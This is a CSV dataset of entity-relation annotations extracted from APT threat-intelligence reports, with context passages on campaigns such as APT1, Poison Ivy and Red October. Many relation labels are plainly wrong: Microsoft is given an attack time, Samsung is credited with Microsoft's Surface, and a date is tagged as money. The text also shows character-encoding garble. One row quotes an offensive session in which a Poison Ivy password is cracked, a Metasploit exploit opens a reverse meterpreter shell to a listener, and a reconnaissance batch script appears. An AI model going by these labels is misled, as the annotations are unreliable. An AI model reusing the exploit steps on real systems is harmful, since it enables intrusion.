"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"theteamspystory_final_t2","hasattacktime","Microsoft","ORG","2010","DATE","Older Keylogging tool Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 and packed with a Visual Basic wrapper . "
"Inside_Report_by_Infosec_Consortium","hasattacktime","CERT","ORG","year after year","DATE","Bot Infected Systems tracked 0 25915 146891 3509166 6893814 6277936 It¡¯s not surprising to note that the threats are increasing at an alarming rate , year after year . In a way , it¡¯s heartening to observe the CERT evolve & rise upto newer challenges & latest threats . "
"icefog","targets","Microsoft Office","ORG","Excel","PRODUCT","The first two vulnerabilities are exploited through Microsoft Office documents ( Word and Excel ) that drop and execute the backdoor and show a fake ¡ ° lure¡± document to the victim . "
"The_Epic_Turla_Operation","hasproduct","G-Data","ORG","Turla","PRODUCT","When G - Data published their Turla paper , there were few details publicly available on how victims get infected with this malware campaign . "
"rpt-china-chopper","hasproduct","China Chopper","ORG","Windows","PRODUCT","China Chopper can also run transparently on both Windows and Linux . This OS and application flexibility make China Chopper an even more dangerous Web shell . ¡ ° Server - side Payload Component¡± on Page 5 showed China Chopper executing on a Windows 2003 IIS server using ASPX . Figure 19 shows it running on Linux with PHP . Here , the contents of the PHP version are just as minimalistic .. While the available options differ depending on what platform China Chopper is running on , the file management features in Linux ( see Figure 20 ) are similar to those in Windows . "
"fireeye-operation-ke3chang","targets","Ke3chang","ORG","Java","PRODUCT","Percent of attacks by industry targeted by Ke3chang actor 4 Ke3chang used the Java vulnerability ( CVE-2012 - 4681 ) before a patch was available . "
"fireeye-malware-supply-chain","hascharacteristics","seven","CARDINAL","one","CARDINAL","We found seven different samples linked to the DTL campaign . All of these samples were detected as Trojan . APT.9002 . These samples were compiled between September 19 , 2012 and July 30 , 2013 . All of these samples were packaged with the DTL PE resource , and one of the samples was signed with the digital certificate from Mgame Corp. "
"RAP002_APT1_Technical_backstage.1.0","usesaddress","¡°John the Ripper¡±","WORK_OF_ART","6","CARDINAL","After compiling ¡ ° John the Ripper¡± , a new format is available : camellia . Here is an example of a brute force session : rootbsd@alien:~/john-1.7.9 - jumbo-7 / run$ cat test.txt $ camellia$ItGoyeyQIvPjT / qBoDKQZg== rootbsd@alien:~/john-1.7.9 - jumbo-7 / run$ ./john --format = camellia test.txt Loaded 1 password hash ( Camellia bruteforce [ 32/32 ] ) No password hashes left to crack ( see FAQ ) rootbsd@alien:~/john-1.7.9 - jumbo-7 / run$ ./john --show test.txt ? : pswpsw 1 password hash cracked , 0 left The key is ¡ ° pswpsw¡±. This key must be used in our homemade Metasploit exploit . 3.4 Exploitation With the information we previously described , we were able to get access to the attackers servers . msf exploit(poisonivy_bof_v2 ) > show options Module options ( exploit / windows / misc / poisonivy_bof_v2 ): Name Current Setting Required Description ---- --------------- -------- ----------- Password pswpsw yes Client password RANDHEADER false yes Send random bytes as the header RHOST X.X.X.X yes The target address RPORT 80 yes The target port Payload options ( windows / meterpreter / reverse_https ): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit : seh , thread , process , none LHOST my_server yes The local listener hostname LPORT 8443 yes The local listener port Exploit target : I d Name -- ---- 0 Poison Ivy 2.3.2 / Windows XP SP3 / Windows 7 SP1 msf exploit(poisonivy_bof_v2 ) > exploit [ * ] Started HTTPS reverse handler on https://my_server:8443/ [ * ] Meterpreter session 1 opened ( my_server:8443 - > Y.Y.Y.Y:3325 ) at 2013 - 03 - 07 07:51:57 +0100 meterpreter > ipconfig Interface 1 = = = = = = = = = = = = Name : MS TCP Loopback interface Hardware MAC : 00:00:00:00:00:00 MTU : 1520 IPv4 Address : 127.0.0.1 IPv4 Netmask : 255.0.0.0 Interface 2 = = = = = = = = = = = = Name : AMD PCNET Family PCI Ethernet Adapter - ................. Hardware MAC : 00:0c:29 : c9:86:57 MTU : 1500 IPv4 Address : 192.168.164.128 IPv4 Netmask : 255.255.255.0 Once connected to the Poison Ivy server , we noticed that the server had no public IP . We attacked a server with the IP X.X.X.X ( identified during the scan ) and the meterpreter endpoint IP address was Y.Y.Y.Y. We concluded that the Poison Ivy daemon was hidden behind a proxy server , by using port forwarding to hide the real IP of the command & control server . We could also identify that the vendor ID of the MAC address is VMWare . By listing the processes , we are able to validate this hypothesis : meterpreter > ps aux Process List = = = = = = = = = = = = PID PPID Name User Path --- ---- ---- ---- ---- 0 0 [ System Process ] 4 0 System 248 704 P232.exe WILLOW-3796929A\willow C:\VIP\IVY\P232.exe 272 780 alg.exe C:\WINDOWS\System32\alg.exe 440 4 smss.exe NT AUTHORITY\SYSTEM \SystemRoot\System32\smss.exe 704 604 explorer.exe WILLOW-3796929A\willow C:\WINDOWS\Explorer . EXE 712 440 csrss.exe NT AUTHORITY\SYSTEM \??\C:\WINDOWS\system32\csrss.exe 736 440 winlogon.exe NT AUTHORITY\SYSTEM \??\C:\WINDOWS\system32\winlogon.exe 780 736 services.exe NT AUTHORITY\SYSTEM C:\WINDOWS\system32\services.exe 792 736 lsass.exe NT AUTHORITY\SYSTEM C:\WINDOWS\system32\lsass.exe 896 1228 wuauclt.exe WILLOW-3796929A\willow C:\WINDOWS\system32\wuauclt.exe 960 780 vmacthlp.exe NT AUTHORITY\SYSTEM C:\Program Files\VMware\VMware Tools\vmacthlp.exe 976 780 svchost.exe NT AUTHORITY\SYSTEM C:\WINDOWS\system32\svchost.exe 1048 780 svchost.exe C:\WINDOWS\system32\svchost.exe 1176 704 VMwareTray.exe WILLOW-3796929A\willow C:\Program Files\VMware\VMware Tools\VMwareTray.exe 1200 780 cmdagent.exe NT AUTHORITY\SYSTEM C:\Program Files\COMODO\COMODO Internet Security\cmdagent.exe 1228 780 svchost.exe NT AUTHORITY\SYSTEM C:\WINDOWS\system32\svchost.exe 1328 704 VMwareUser.exe WILLOW-3796929A\willow C:\Program Files\VMware\VMware Tools\VMwareUser.exe 1384 780 svchost.exe C:\WINDOWS\system32\svchost.exe 1448 780 svchost.exe C:\WINDOWS\system32\svchost.exe 1472 780 ZhuDongFangYu.exe NT AUTHORITY\SYSTEM C:\Program Files\360\360Safe\ deepscan\zhudongfangyu.exe 1568 780 spoolsv.exe NT AUTHORITY\SYSTEM C:\WINDOWS\system32\spoolsv.exe 1592 704 ctfmon.exe WILLOW-3796929A\willow C:\WINDOWS\system32\ctfmon.exe 1860 780 VMwareService.exe NT AUTHORITY\SYSTEM C:\Program Files\VMware\VMware Tools\VMwareService.exe 2232 1044 xPort.exe WILLOW-3796929A\willow C:\VIP\CMD\xPort.exe 3072 3032 conime.exe WILLOW-3796929A\willow C:\WINDOWS\system32\conime.exe 3196 704 cfp.exe WILLOW-3796929A\willow C:\Program Files\COMODO\COMODO Internet Security\cfp.exe 3.5 Shellcode After a few days the attackers detected our presence on their systems , particularly because of the network connections between their Poison Ivy machines and our machines . Using the netstat command they were able to detect our connection . Basically , the Poison Ivy server only had connections originating from the proxy server and no connection from any other IP . In order to stay stealth we had to connect to the Poison Ivy server through the proxy server . To establish this connection we decided to create our own shellcode . The principle of our shellcode is as follows : - Once injected in a process , the shellcode looks for open sockets ; - Once a opened socket is detected , this socket is closed ; - After , the shellcode binds itself on the previous open port ; - From now on , we are going to use the same technique than the one used in meterpreter ( bind_tcp ) . Our shellcode goal is to close the Poison Ivy daemon¡¯s socket and then open our own socket on the same port . Once our socket is opened we can use the proxy chains provided by the attackers to connect to the Poison Ivy server . In this case , when attackers checked the opened connections using netstat they could not identify our connection since it appeared to be originating from an infected targetÿ The source code of the shellcode can be found in appendix . 4 Information obtained on the C&C 4.1 Infrastructure schema Our investigation allowed us to draw a network schema of the attackers¡¯ infrastructure . Figure 2 : Network schema The infected machines communicate with the proxy through the Internet . The proxy server will forward the network packets to the Poison Ivy server . The proxy feature is done by an executable called xport.exe . This executable can encode network traffic using a xor operation . This feature requires having the executable running on both machines : the proxy and the Poison Ivy server . The syntax on the proxy server is : xport.exe Proxy_ip proxy_port Poison_Ivy_ip Poison_Ivy_port number The argument number can either be set to 1 or 2 and represents the two different encoding keys . The syntax on the Poison Ivy server is : xport.exe Poison_Ivy_ip Poison_Ivy_port localhost Poison_Ivy_daemon_port number The Poison Ivy server is managed by the attackers through a VMWare remote desktop , so that we were not able to get the real IP address of the attacker . During our investigation , we identified an established Remote Desktop Protocol ( RDP ) connection between the Poison Ivy server and the proxy server . We decided to install a key - logger on the Poison Ivy server that allowed us to see credentials to remotely connect to the proxy server . Since the attackers use RDP to manage the proxy server and that we had access , we copied the Windows event logs . Those logs contained all IPs which established a successful RDP authentication . We identified more than 350 unique IPs : rootbsd@alien:~/APT1 $ cat list_ip.txt | sort .u | wc -l 384 We suppose that this list also contains Poison Ivy servers IPs and maybe IPs of attackers who inadvertently connect directly to the proxy ) . Here is the screenshot of the proxy RDP authentication : Figure 3 : Proxy server login window Here is the screenshot of the Poison Ivy interface : Figure 4 : Poison Ivy interface with the list of connected machines Here is the screenshot of an attacker using a remote shell to an infected target : Figure 5 : Poison Ivy interface with a shell Using those accesses , we managed to exfiltrate a massive amount of files , event logs , netstat outputsÿ The interesting information can be divided in two categories : - Information about the tools used by the attackers ; - Information about the targets . 4.2 Tools The following table provides an overview on the discovered tools . Name MD5 Description KeyX.exe 3d0760bbc1b8c0bc14e8510a66bf6d99 Keylogger , log in % APPDATA%/teeamware.log TmUpdate.exe b31b9dd9d29330917627f9f916987f3c Unknown : the binary opens ports 443 and 3126 ggg.exe 1295f4a3659cb481b6ae051b61567d7d Dumps hashes . Usage : ggg.exe < LSASS Process ID > < HashFileName > ggg64.exe 3fd2c4507b23e26d427f89129b2476ac Dumps Hashes ( 64bits version ) . Usage : ggg64.exe < LSASS Process ID > < HashFileName > iochttp.exe a476dd10d34064514af906fc37fc12a3 Unknown : opens the port 80 and uses the library https://code.google.com/p/spserver/ iochttp3.exe d91a6d50702822330acac8b36b15bb6c Unknown : open the port 80 and uses the library https://code.google.com/p/spserver/ ippmin.exe ffea249e19495e02d61aa52e981cebd8 Unpacked version of TmUpdate.exe m.exe 5b4d4d6d77954107d927eb1987dd43fb This tool will listen on the port-[localport ] at the same time , receive two connections on the same port , and exchanges data between two connections . Usage : MapPort2 [ localport ] [ localip ] map.exe 266fbfd5cacfcac975e11a3dacd91923 This tool will build two connections , One is from local host to raddr1 : rport1 , another is from local host to raddr2 : rport2 and it will exchange data between these two connections . Usage : MapPort3 [ raddr1 ] [ rport1 ] [ raddr2 ] [ rport2 ] nc.exe ab41b1e2db77cebd9e2779110ee3915d Official netcat binary nc1.exe 8be39ba7ced43bef5b523193d94320eb Packed version of netcat nc2.exe 2937e2b37d8bb3d9fe96ded7e6f763aa Packed version of netcat putty.exe 9bb6826905965c13be1c84cc0ff83f42 Official putty binary xPort.exe 2aabd170dae5982e5d93dc6fd9f2723a Port forward tool pwdump.dll 7a115108739c7d400b4e036fe995519f Password dump 64 bits ( library ) pwdump.exe f140e0e9aab19fefb7e47d1ea2e7c560 Password dump 64 bits ( binary ) Private a78cbc7d652955be49498ee9834e6a2d RAT , we keep the name private because it contains the name of the target Private 40a3e68eafd50c02b076acf71d1569db RAT , we keep the name private because it contains the name of the target Private 5682aa66f0d1566cf3b7e27946943b4f RAT , we keep the name private because it contains the name of the target Private c16269c4a32062863b63a123951166d2 RAT , we keep the name private because it contains the name of the target Terminator3.6.exe 669cef1b64aa530292cc823981c506f6 Homemade RAT server called Terminator ( aka Fakem RAT ) Shtrace.exe 380fe92c23f2028459f54cb289c3553f Malware sample of the RAT Terminator ( aka Fakem RAT ) EXP.EXE e258cf52ef4659ed816f3d084b3ec6c7 The binary contains Oracle DB queries getos.exe 71d3f12a947b4da2b7da3bee4193a110 Binary to collect information as group , server and OS via SMB dump.exe a4ad1d1a512a7e00d2d4c843ef559a7a gsecdump v0.7 by Johannes Gumbel nltest.exe 53b77ada5498ef207d48a76243051a01 http://technet.microsoft.com/en-us/library/cc731935%28v=ws.10%29.aspx pr.exe 98a65022855013588603b8bed1256d5e Dotpot Port Scanner Ver 0.92 wget.exe 57a9d084b7d016f776bfc78a2e76d03d Official wget binary xForceDel.ex 9fbea622b9a1361637e0b97d7dd34560 Tool to delete lock file The RAT called Terminator will be described in the next chapter . We found a batch script similar to the one described in Mandiant¡¯s report : @echo off echo % computername% > > c:\recycler\%computername%_base.dat qwinsta > > c:\recycler\%computername%_base.dat date /t > > c:\recycler\%computername%_base.dat time /t > > c:\recycler\%computername%_base.dat ipconfig /all > > c:\recycler\%computername%_base.dat nbtstat -n > > c:\recycler\%computername%_base.dat systeminfo > > c:\recycler\%computername%_base.dat set > > c:\recycler\%computername%_base.dat net share > > c:\recycler\%computername%_base.dat net start > > c:\recycler\%computername%_base.dat tasklist /v > > c:\recycler\%computername%_base.dat netstat -ano > > c:\recycler\%computername%_base.dat dir c:\ /a > > c:\recycler\%computername%_base.dat dir d:\ /a > > c:\recycler\%computername%_base.dat dir c:\progra~1 > > c:\recycler\%computername%_base.dat dir c:\docume~1 > > c:\recycler\%computername%_base.dat net view /domain > > c:\recycler\%computername%_base.dat dir /a /s c:\ > > c:\recycler\%computername%_filelist.dat dir /a /s d:\ > > c:\recycler\%computername%_filelist.dat del c:\recycler\base.bat The purpose of this batch script is to get information about an infected workstation . In addition , we found a directory with the official SecureCrt , which is an SSH client . We also found the SysInternals suite from Microsoft . 4.3 Targets The attackers seem to use a dedicated proxy and Poison Ivy server combination for each target . When a target discovers the IP address of a proxy , this address is reassigned to another target . That¡¯s why it is primordial to share the C&C servers IPs with our partners . The targets were private and public companies , political institutions , activists , associations or reporters . On the Poison Ivy server , a directory is created for every target . Within this directory , a directory for each infected machine was created . The naming convention for those directories is HOSTNAME^USERNAME . Here is an example : E:\companyABCD\alien^rootbsd\ In those directories files are not sorted in any specific manner . The documents types are : - .PPT - .XLS - .DOC - .PDF - .JPG Among those documents , we found : - Network diagrams ; - Internal IP / user / password combination ( local administrator , domain administrator , root , web , webcamÿ ) ; - Map of the building with digital code to open doors ; - Security incident listings ; - Security policies ; - ÿ The sensitive documents were password protected . The passwords pattern is [ a - z]{3,4}[0 - 9]{3,4 } , so it was easy to brute force them in reasonable time . Here is an example of a network diagram . Figure 6 : Example of network target diagram 5 Terminator RAT ( aka Fakem RAT ) 5.1 Description "
"fireeye-poison-ivy-report","hasattacktime","Poison Ivy","ORG","2009","DATE","Several ongoing cyber attack campaigns use Poison Ivy , including these : . admin@338¡ªActive since 2008 , this campaign mostly targets the financial services industry , though we have also seen activity in the telecom , government , and defense sectors . . th3bug¡ªFirst detected in 2009 , this campaign targets a number of industries , primarily higher education and healthcare . . menuPass¡ªAlso launched in 2009 , this campaign appears to originate from China , targeting U.S. and overseas defense contractors . "
"fireeye-malware-supply-chain","targets","Sunshop","PERSON","Sunshop","PRODUCT","We have detailed the specifics of the Sunshop campaign on the FireEye blog.6 We found 15 different samples linked to the Sunshop campaign . These samples were detected as Trojan . APT.Gh0st , Trojan . APT.PoisonIvy , Trojan . APT . Briba , and Trojan . APT.9002 . All of the Sunshop samples that we identified had compile times between January 1 , 2013 and August 24 , 2013 . "
"themysteryofthepdf0-dayassemblermicrobackdoor","hasproduct","PDF","ORG","Itaduke","PRODUCT","For instance , after exploiting the vulnerability , it searches for a specific signature within the PDF file . While the ¡ ° Itaduke¡± shellcode was looking for ¡ ° ! H2bYm . "
"Mandiant_APT1_Report","hasattacklocation","Chinese","NORP","China","GPE","¡ ° Simplified Chinese¡± is a streamlined set of the traditional Chinese characters that have been in use since the 1950s , originating in mainland China . "
"rpt-china-chopper","hasattacklocation","4 kilobyte","QUANTITY","China","GPE","To contribute something new to the public knowledge base¡ªespecially for those who happen to find the China Chopper server - side payload on one of their Web servers¡ªFireEye studied the components , capabilities , payload attributes , and the detection rate of this 4 kilobyte menace . This report describes the features that make China Chopper an increasingly popular tool for cyber attackers . "
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy","ORG","Australia","GPE","Taken together , FinSpy servers are currently , or have been present , in 25 countries . Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam . "
"India_Pak_Tranchulas","hasattacklocation","Indian","NORP","Pakistan","GPE","Hypothesis 6 : An unidentified Indian entity developed and used this malware as a realistic simulated exercise to perform penetration testing and evaluate theirreadiness in the event of actual Pakistani affiliated offensive network operations . The files and infrastructure used for the simulation were submitted to publicly available malware analysis services . Conclusion : Considering the long - standing regional tensions between India and Pakistan , South Asia serves as a likely flashpoint for conventional conflict to carry over andplay out within cyberspace . "
"2013-9","hasattacklocation","Shamoon","ORG","the United States","GPE","Shamoon was designed to replace data on hard drives with a picture of a burning American flag and report the ad.dress of the computer back to a separate computer inside the company network.44 This is potentially significant because Aramco is the world¡¯s largest producer of oil , and was originally a joint effort with the United States ( Arabian American Oil Company).45,46 "
"rpt-operation-saffron-rose","hasproduct","DelphiNative.DLL","ORG","IntelRS.exe","PRODUCT","Harvests data from installed cookies IntelRS.exe loads a Delphi component called DelphiNative . DLL , which implements some additional data theft functionality for the following : . "
"wp-fakem-rat","hasproduct","Yahoo","ORG","Messenger","PRODUCT","FIGURE 7 : FAKEM domains associated with the Windows Messenger and HTML variants Meanwhile , the Yahoo ! "
"rpt-china-chopper","hasattacklocation","FireEye","ORG","China","GPE","To contribute something new to the public knowledge base¡ªespecially for those who happen to find the China Chopper server - side payload on one of their Web servers¡ªFireEye studied the components , capabilities , payload attributes , and the detection rate of this 4 kilobyte menace . This report describes the features that make China Chopper an increasingly popular tool for cyber attackers . "
"securelist.com-Red October Detailed Malware Description 4 Second Stage of Attack","hasproduct","MS Exchange","ORG","MS Excahnge","PRODUCT","If ports 80 or 8080 are open , then the module sends simple HTTP request to test if the remote webserver is available and if it is running MS Excahnge server . MS Exchange is probed with the following HTTP request : GET /ews / exchange.asmx HTTP/1.0 "
"theteamspystory_final_t2","targets","¡°TeamSpy","ORG","TeamViewer","PRODUCT","We are calling this threat actor the ¡ ° TeamSpy crew¡± because of their preference for using the legal software TeamViewer as a main part of their toolset . "
"RAP002_APT1_Technical_backstage.1.0","hasproduct","RDP","ORG","Remote Desktop Protocol","PRODUCT","During our investigation , we identified an established Remote Desktop Protocol ( RDP ) connection between the Poison Ivy server and the proxy server . We decided to install a key - logger on the Poison Ivy server that allowed us to see credentials to remotely connect to the proxy server . Since the attackers use RDP to manage the proxy server and that we had access , we copied the Windows event logs . "
"rpt-operation-saffron-rose","hasproduct","vaultcli.DLL","ORG","Remote Desktop Protocol","PRODUCT","Remote Desktop Protocol ( RDP ) accounts . Browser URLs The Stealer component uses common techniques to acquire credential data . For instance , it loads vaultcli . DLL and uses various APIs shown below to acquire RDP accounts from the Windows vault . "
"hidden_lynx","hasattacktime","Microsoft","ORG","July 10","DATE","An unsigned version of Naid was distributed to select victims within the defense industrial sector during phase one until Microsoft supplied a patch for CVE-2012 - 1889 on July 10 . "
"themysteryofthepdf0-dayassemblermicrobackdoor","indicates","LoadLibary API. Resource 102","PRODUCT","102","CARDINAL","It contains two binary resources , 101 and 102 . Resource 101 is the main backdoor DLL component . It is written to the % AppData% directory and loaded using LoadLibary API . Resource 102 is the decoy PDF document . "
"The Syrian Malware House of Cards - Securelist","hasattacklocation","Syrian­based","NORP","United States","GPE","We have seen victims of Syrian­based malware in : 1 . Turkey 2 . Saudi Arabia 3 . Lebanon 4 . Palestine 5 . United Arab Emirates 6 . Israel 7 . Morocco 8 . France 9 . United States "
"Mandiant_APT1_Report","hascharacteristics","the Pudong New Area  .. Headquarters","FAC","one","CARDINAL","An APT1 persona¡¯s self - identified location is the Pudong New Area .. Headquarters and other facilities spread throughout the Pudong New Area of Shanghai , China Infrastructure .. Ready access to four main net blocks in Shanghai , hosted by China Unicom ( one of two Tier 1 ISPs in China ) .. "
"Securelist_RedOctober_Detail","hasproduct","LHAFD.GCP","ORG","RC4","PRODUCT","The "" LHAFD.GCP "" file is encrypted with RC4 and compressed with the "" Zlib "" library . "
"Mandiant_APT1_Report","hasattacklocation","WEBC2","ORG","Mexico","GPE","The programs acting as APT1 servers have mainly been : ( 1 ) FTP , for transferring files ; ( 2 ) web , primarily for WEBC2 ; ( 3 ) RDP , for remote graphical control of a system ; ( 4 ) HTRAN , for proxying ; and ( 5 ) C2 servers associated with various backdoor families ( covered in Appendix C : The Malware Arsenal ) . Global distribution of con.rmed APT1 servers Taiwan ( 6 ) Canada ( 3 ) Australia ( 2 ) Mexico ( 2 ) Norway ( 2 ) Belgium ( 1 ) Denmark ( 1 ) Indonesia ( 1 ) India ( 1 ) Singapore ( 1 ) Distribution of con.rmed APT1 servers in China 139.226.0.0 - 139.227.255.255 : 19 ( Shanghai ) 112.64.0.0 - 112.65.255.255 : 93 ( Shanghai ) "
"hidden_lynx","hasattacktime","Bit9","ORG","June 25","DATE","In conjunction with the Bit9 compromise , the Hidden Lynx group had another significant campaign well under way . They had just concluded phase one of the VOHO campaign , a watering - hole operation orchestrated to attack organizations in the Boston , Massachusetts area . it was a likely a distribution vector for the newly signed files . The VOHO campaign The VOHO campaign , first publicized by RSA , is one of the largest and most successful watering - hole attacks to date . The campaign combined both regional and industry - specific attacks and predominantly targeted organizations that operate in the United States . In a rapidly spreading two - phase attack , which started on June 25 and finished July 18 , nearly 4,000 machines had downloaded a malicious payload . "
"fireeye-operation-ke3chang","hasattacktime","Ke3chang","ORG","at least 2010","DATE","Furthermore , FireEye has presented evidence indicating that the Ke3chang attackers have been active since at least 2010 and have attacked targets related to G20 meetings in the past . "
"Mandiant_APT1_Report","hasattacklocation","¡°The Chinese People¡¯s Liberation Army Signals Intelligence and Cyber Reconnaissance Infrastructure,¡± Project 2049 Institute","ORG","Beijing China","GPE","42 Mark A. Stokes , Jenny Lin , and L.C. Russell Hsiao , ¡ ° The Chinese People¡¯s Liberation Army Signals Intelligence and Cyber Reconnaissance Infrastructure,¡± Project 2049 Institute ( 2011 ): 6 - 7 , http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf , accessed February 6 , 2013 . 43 Sohu.com is a popular Chinese search engine , webmail , and Internet advertising company based out of Beijing China . "
"wp-fakem-rat","hasproduct","YMSG","ORG","Messenger","PRODUCT","Messenger traffic beyond the use of the header , YMSG . "
"15-2013-youonlyclicktwice","hasattacklocation","Lieu Giai str","PERSON","Vietnam","GPE","IP Address : 183.91.2.199 inetnum : 183.91.0.0 . 183.91.9.255 netname : FTTX - NET country : Vietnam address : CMC Telecom Infrastructure Company address : Tang 3 , 16 Lieu Giai str , Ba Dinh , Ha Noi This server was active until very recently and matched our signatures for a FinSpy command and control server . Both the command & control server IP and the phone number used for text - message exfiltration are in Vietnam which indicates a domestic campaign . "
"crowdstrike-deep-panda-report","hasproduct","Vista","ORG","Windows","PRODUCT","Network Stack Hooking  the version is necessary because Windows versions beginning with Vista utilize a redesigned TCP / IP net.work stack , most hooking operations will require a different implementation for these versions . "
"securelist.com-Red October Detailed Malware Description 5 Second Stage of Attack","hasproduct","PE Exe","ORG","Visual C","PRODUCT","Launcher components File names : pdf_viewer.exe , word.exe , excel.exe , iexplorer.exe , img.exe , powerpoint.exe , wceloader.exe , wmplauer.exe All files are compiled with PE Exe file compiled with Microsoft Visual C++ 2005 . "
"fireeye-poison-ivy-report","hasattacktime","Poison Ivy","ORG","2008","DATE","Several ongoing cyber attack campaigns use Poison Ivy , including these : . admin@338¡ªActive since 2008 , this campaign mostly targets the financial services industry , though we have also seen activity in the telecom , government , and defense sectors . "
"rpt-operation-saffron-rose","hasproduct","Firefox","ORG","Remote Desktop Protocol","PRODUCT","Tracks credentials , bookmarks and history from major browsers : Chrome , Firefox , Opera . Collects email account information . Extracts installed proxy software configuration information . Harvests data from installed cookies IntelRS.exe loads a Delphi component called DelphiNative . DLL , which implements some additional data theft functionality for the following : . Internet Explorer ( IE ) accounts . Remote Desktop Protocol ( RDP ) accounts . "
"Secrets_of_the_Comfoo_Masters","hasattacklocation","Comfoo","ORG","the United States","GPE","Passive monitoring results While monitoring Comfoo , CTU researchers detected more than 200 variants of the tro.jan and 64 different campaign tags used by the threat actors to organize their cam.paigns . Numerous government entities and private companies based in the United States , Europe , and Asia Pacific had Comfoo - infected computers phoning home to the Comfoo C2 infrastructure ( see Figure 5 ) . "
"Safe-a-targeted-threat","hasproduct","UsbExe   Tools","ORG","OpenDoc","PRODUCT","OpenDoc . UsbDoc . UsbExe Tools "
"rpt-china-chopper","hasproduct","JSP","ORG","Windows","PRODUCT","China Chopper can run on any Web server capable of running JSP , ASP , ASPX , PHP , or CFM¡ªthe majority of Web application languages . China Chopper can also run transparently on both Windows and Linux . This OS and application flexibility make China Chopper an even more dangerous Web shell . ¡ ° Server - side Payload Component¡± on Page 5 showed China Chopper executing on a Windows 2003 IIS server using ASPX . Figure 19 shows it running on Linux with PHP . Here , the contents of the PHP version are just as minimalistic .. While the available options differ depending on what platform China Chopper is running on , the file management features in Linux ( see Figure 20 ) are similar to those in Windows . "
"Mandiant_APT1_Report","hasproduct","Samsung","ORG","¡¯s Surface","PRODUCT","These include Apple¡¯s iPad , Samsung¡¯s Galaxy Tab , and Microsoft¡¯s Surface . "
"TA14-353A_wiper","indicates","445","CARDINAL","every five minutes","TIME","It connects home every five minutes to send log data back to command and control ( C2 ) infrastructure if it has successfully spread to other Windows hosts via SMB port 445 . "
"fireeye-operation-ke3chang","authored","Prince Charming","PERSON","two","CARDINAL","These included what appear to be three administrative tests by the attackers and two connections from other malware researchers . Among the targets , we identified nine compromises at government ministries in five different European countries . Eight of these compromises were at MFAs . When FireEye had visibility on the CnC server , we saw the attackers engage in post - compromise information gathering and lateral movement on the target network , where upon FireEye immediately contacted the relevant authorities and began the notification process . The changing face of espionage Alas , poor James Bond . The days are over when spies had to be both a black belt and Prince Charming in the same scene . "
"securelist.com-Red October Detailed Malware Description 1 First Stage of Attack","indicates","Visual Studio 2005","PRODUCT","Microsoft","ORG","The module is a PE EXE file , compiled with Microsoft Visual Studio 2005 . "
"securelist.com-Red October Detailed Malware Description 5 Second Stage of Attack","indicates","2011.07.18","MONEY","07:03:52","TIME","( GMT ) E8711B9DBB3E7A6FBC1DF70F7131520C 2011.07.18 07:03:52 ( GMT ) A8B8F616FFD94D34E4E188657A5C8BA7 2011.07.18 07:03:52 ( GMT ) E461B07E2A11ED13DDC0F27162545DE1 2011.07.18 07:03:52 ( GMT ) "
"Operation_DeputyDog","hasattacklocation","Bit9.  Campaign Details","ORG","Japan","GPE","Analysis based on our Dynamic Threat Intelligence cluster shows that this current campaign leveraged command and control infrastructure that is related to the infrastructure used in the attack on Bit9 . Campaign Details On September 17 , 2013 Microsoft published details regarding a new zero - day exploit in Internet Explorer that was being used in targeted attacks . FireEye can confirm reports that these attacks were directed against entities in Japan . "
"Presentation_Targeted-Attacks_EN","hasattacktime","about $20K","MONEY","2 days","DATE","Adat- ¨ ¦ s Rendszerbiztons¨¢g Laborat¨ ® rium www.crysys.hu CrySyS logo NEW 3 25 Rapid SSL attack in 2008 .collaboration of hackers and academics led by Alex Sotirov and Marc Stevens .demonstrated a practical MD5 collision attack against the RapidSSL CA .resulted in a fake SSL certificate trusted by all browsers .generating a collision required 2 days on a cluster of 200 PS3s .equivalent to about $ 20 K computing capacity on Amazon EC2 source : presentation of Alex Sotirov Laboratory of Cryptography and System Security CrySyS "
